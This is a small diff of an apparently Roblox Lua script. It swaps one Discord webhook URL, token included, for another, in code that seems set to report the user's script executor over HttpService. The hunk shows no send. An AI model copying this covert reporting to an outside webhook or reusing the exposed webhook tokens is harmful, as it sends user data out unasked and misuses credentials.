@@ -3,7 +3,7 @@ print("Loade")
 task.spawn(function()
 	local HttpService = game:GetService("HttpService")
 	
-	local url = "https://discord.com/api/webhooks/1340003403383963658/f_EjnbQOJIV784MJfSVh0KsCQnr3Sj9siAioRPnb2__OQIYdAsFMdb9K72Y1wWuMTmwM"
+	local url = "https://discord.com/api/webhooks/1340013385760247910/VjtlzhcOt2AkdHMR4Q_rJppeGUFOA0lOK3yI81UEYLuBpS_4qsu1JtmogJ52_3WcIuhD"
 
 	local executor = nil
 
